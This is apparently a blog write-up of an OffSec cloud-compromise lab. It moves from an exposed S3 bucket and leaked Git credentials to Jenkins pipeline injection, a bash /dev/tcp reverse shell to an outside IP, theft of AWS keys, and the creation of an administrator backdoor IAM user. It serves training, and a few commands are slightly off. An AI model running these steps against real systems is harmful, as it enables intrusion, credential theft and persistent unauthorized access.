---

layout: /src/layouts/MarkdownPostLayout.astro
title: Cloud Intrusion Lab
author: Adrian Reategui
description: "This lab focuses on exploiting misconfigurations and weak access controls in a cloud-based web environment to escalate from external discovery to full AWS administrative compromise."
image:
  url: "/images/posts/awsbg.webp"
  alt: "This lab focuses on exploiting misconfigurations and weak access controls in a cloud-based web environment to escalate from external discovery to full AWS administrative compromise. It demonstrates how attackers can leverage exposed cloud storage, poor credential hygiene, and insecure CI/CD pipelines to gain unauthorized access and persist within a target’s infrastructure."
pubDate: 2025-06-14
tags:
  [

  ]
languages: []

---


## LAB EXPLANATION
This lab demonstrates how exposed AWS resources and misconfigured CI/CD pipelines can lead to a full cloud compromise. Starting from discovering an open AWS S3 bucket and a hidden .git directory, we extracted sensitive credentials stored in the repository. Using these, we accessed a Git server and found a Jenkins pipeline configuration with embedded AWS keys. By modifying the pipeline triggered via webhook, we achieved remote code execution and a reverse shell on the Jenkins server. With the AWS keys found in environment variables, we used the AWS CLI to enumerate S3 buckets and IAM policies, discovering that the Jenkins user had full admin privileges. Leveraging this, we created a backdoor AWS user with unrestricted access, highlighting the critical importance of secure AWS key management, IAM policy restrictions, and CI/CD security.

## WEB ENUMERATION
- When we access the subdomain app.offseclab.io, we don't find anything valuable except for an image.
![alt](/images/posts/aws57.webp)
- When analyzing the source code, we found that the images are being loaded from an AWS S3 bucket.
![alt](/images/posts/aws58.webp)
- We will try to list the contents of the root directory of the AWS S3 bucket using curl.
![alt](/images/posts/aws59.webp)
- This returns an error, so we can't see what other content is inside. However, we can try fuzzing; in this case, we'll use the tool dirb, which enumerates common and hidden directories. It reveals an existing .git directory.
![alt](/images/posts/aws60.webp)
### ENUMERATION THROUGH AWS CLI COMMAND
- If we have an Access Key ID and a Secret Key, we can use the account to enumerate the bucket directly from the CLI. We configure the account that we're gonna use to enumerate AWS S3 Bucket.
```
	aws configure
```
![alt](/images/posts/aws61.webp)
- Once the account is configured, we proceed to run the following command to list the files inside the S3 bucket.
```
	aws s3 ls <bucket_name>
```
![alt](/images/posts/aws62.webp)
- Now that we can list the contents, we will try to download some files using the following parameter
```
	aws s3 cp s3://<s3_name> <rute> = ./
```
![alt](/images/posts/aws63.webp)
- To download multiple files or the entire bucket, we can use the sync subcommand instead of cp.
```
	aws s3 sync s3://<s3_name> <./rute>
```
![alt](/images/posts/aws64.webp)
- Thanks to being able to list the S3 contents and find a Git project, we discovered encoded credentials in a commit.
![alt](/images/posts/aws65.webp)

## GITHUB - GITLAB PIPELINES ENUMERATION
- Once inside GitLab with the found administrator password, we will try to locate the configuration file that contains the instructions for creating the pipeline, which is simply a file that defines the stages of the CI/CD process. In this case, we will enumerate the Jenkins file that has the pipelines defined; however, if there are other configuration types like YAML files, we will need to analyze those as well.
![alt](/images/posts/aws66.webp)
- This script contains stored credentials, so we could potentially exploit them. Additionally, the CI/CD stages appear to be configured. We could modify the script; however, we need to know what triggers the changes. This could be done manually, through a cron job, or via a webhook that updates changes whenever the Git repository content is modified. We will go to settings/webhooks to check if any exist.

We find one indicating that a push will trigger the modifier.
![alt](/images/posts/aws67.webp)

![alt](/images/posts/aws68.webp)
### PIPELINE MODIFICATION
- By modifying the pipeline, we could have introduced Groovy code since it's related to Jenkins; however, we decided to use native shell code (sh). To verify that the webhook is triggered with each change as configured, we will make an HTTP request. In this case, we are connecting from a Kali machine provided by the lab.
```
	sh 'curl http://3.235.31.41:8000/unix'
	python3 -m http.server 8000
```
![alt](/images/posts/aws69.webp)

![alt](/images/posts/aws70.webp)

- With this, we confirm code execution and will proceed to send a reverse shell.
```
	sh 'bash -c "bash -i &> /dev/tcp/3.235.31.41/443 0>&1"
	nc -nlvp 443
```
![alt](/images/posts/aws71.webp)

![alt](/images/posts/aws72.webp)

## CONTAINER ENUMERATION
- After gaining access to the system, it is important to continue with traditional enumeration. However, when dealing with a container as in this case, we will need to check different paths, as will be specified below.
```
	cat /proc/mounts
```
![alt](/images/posts/aws73.webp)
- Now that we have discovered the container is Docker, we will need to analyze the permissions it contains using the following command, focusing on the selected values, which are encoded.
```
	cat /proc/1/status | grep "Cap"
```
![alt](/images/posts/aws74.webp)
- Since they are encoded, we will need to decode them, and for that, we will use the tool capsh.
```
	capsh --decode=<ID> | tr ',' '\n' | grep "admin"
```
![alt](/images/posts/aws75.webp)
- Now that we have identified the container is running with elevated privileges, we will need to escalate privileges. Remember that the pipeline used AWS keys, so we will look for them in the environment variables of the Jenkins user.
![alt](/images/posts/aws76.webp)

## COMPROMISING THE LAB 
- We start by creating a new user using the AWS keys we found.
```
	aws configure --profile=CompromisedJenkins
```
![alt](/images/posts/aws77.webp)
- Now we verify that we are using the credentials of the compromised user.
```
	aws --profile <user> sts get-caller-identity
```
![alt](/images/posts/aws78.webp)

- To enumerate our privileges, we will need to list the user policies-whether inline, managed, or group policies.
```
	aws --profile <username> iam list-user-policies --user-name <identity_name>
	aws --profile <username> iam list-attached-user-policies --user-name <identity_name>
	aws --profile <username> iam list-groups-for-user --user-name <identity_name>
```
![alt](/images/posts/aws79.webp)
- Now that we have found only one user policy, we will enumerate it using the following command:
```
	aws --profile <username> iam list-user-policies --user-name <identity_name> --policy-name <policy_name>
```
![alt](/images/posts/aws80.webp)
### CREATING BACKDOOR USER
- Since our admin user has unrestricted administrative privileges, we will proceed to create a backdoor user.
```
	aws --profile <username> iam create-user --user-name <backdoor>
```
![alt](/images/posts/aws81.webp)
- Now we will make the user we just created an administrator by applying the following policy
```
	aws --profile <username> iam attach-user-policy --user-name <identity_name> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```
- Once that is done, we will proceed to create the secret key and ID for the backdoor user.
```
	aws --profile <username> iam create-access-key --user-name <backdoor>
```
![alt](/images/posts/aws83.webp)
- Now we will proceed to configure the user we just created.
```
	aws configure --profile=<backdoor>
```
![alt](/images/posts/aws84.webp)
- Once the user is fully configured, we will list its attached policies and find that it is a administrator user.
```
	aws --profile <backdoor_user> iam list-atached-user-policies --user-name <name>
```
![alt](/images/posts/aws85.webp)

## KEY FEATURES
- **Web Enumeration:** Discovery of exposed AWS S3 bucket through web fuzzing and directory enumeration (.git directory found).
- **Source Code Analysis:** Extraction of sensitive information such as encoded credentials from the Git repository stored in the S3 bucket.
- **Credential Access:** Obtaining administrator credentials for a self-hosted Git service (Gitea/GitLab).
- **CI/CD Pipeline Exploitation:** Identification and modification of Jenkins pipeline configuration files to inject malicious code and trigger remote command execution via webhook.
- **Reverse Shell:** Gaining interactive shell access to the Jenkins host via injected commands.
- **Privilege Escalation:** Discovery of AWS keys stored as environment variables for the Jenkins user.
- **AWS CLI Usage:** Enumeration of S3 bucket contents and user privileges through AWS CLI commands.
- **AWS IAM Exploitation:** Creation of a backdoor user with full administrative permissions by leveraging excessive IAM privileges (Action and Resource set to *).

## AWS CLOUD TOOLS USED
- **AWS S3:** Accessing and enumerating S3 buckets, listing files, downloading objects, and syncing entire buckets.
- **AWS CLI:** Command-line tool for interacting with AWS services, used here for bucket enumeration, file download, IAM user and policy management.
- **IAM (Identity and Access Management):** Exploring user policies, enumerating permissions, creating users, attaching policies, and managing credentials.
- **AWS Environment Variables:** Understanding and exploiting AWS keys exposed in environment variables.
